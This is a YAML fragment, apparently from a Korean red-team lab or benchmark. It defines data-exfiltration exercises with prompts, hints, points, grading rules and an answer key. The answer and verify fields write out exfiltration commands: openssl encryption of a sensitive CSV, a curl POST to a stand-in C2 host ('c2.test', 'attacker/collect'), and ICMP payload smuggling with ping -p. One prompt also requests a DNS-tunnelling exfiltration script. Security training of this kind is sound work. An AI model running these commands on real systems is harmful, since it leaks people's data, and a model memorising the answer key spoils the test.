  bastion_prompt: '[RED] DNS 터널링을 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 base64로 인코딩하여 DNS 쿼리에
    포함시키는 스크립트를 작성하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: '[RED] HTTPS와 ICMP를 이용한 멀티채널 유출을 시뮬레이션하라. 데이터를 암호화하여 HTTPS POST에 포함하고,
    ICMP 페이로드에도 은닉하라.'
  hint: openssl로 암호화하고 curl로 POST, ping -p로 ICMP 데이터를 전송한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] HTTPS와 ICMP를 이용한 멀티채널 유출을 시뮬레이션해줘

    📎 참고 (CLI): gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl
    enc -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin
    -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null && echo "=== Multi-Channel Exfiltration
    ===" && echo "Channel 1 - HTTPS: curl -X POST https://c2.test/upload -F file=@/tmp/exfil_encrypted.bin"
    && echo "Channel 2 - ICMP:" && echo -n "EXFIL_TEST" | xxd -p | head -c 32 > /tmp/icmp_payload.txt
    && ping -c 1 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1 | head -3 && echo
    "Multi-channel exfiltration simulated"'
  answer_detail: 멀티채널 유출은 데이터를 분할하여 여러 프로토콜로 동시에 전송한다. HTTPS(암호화), ICMP(간과되기 쉬움)를
    조합하면 단일 채널 차단으로 유출을 완전히 막을 수 없다.
  verify:
    type: output_contains
    expect: Multi-Channel
    semantic:
      intent: '[RED] 멀티채널 유출 — HTTPS POST (curl -X POST -d @encrypted_data https://attacker/collect,
        openssl 로 사전 암호화) + ICMP payload (ping -p <hex> <attacker>, packet data 필드에
        숨김). 두 채널 병행으로 탐지 어려움 증가: HTTPS 는 TLS 로 내용 감추고 ICMP 는 예상 밖 채널. MITRE T1048.002
        HTTPS + T1095 Non-Application Layer Protocol'
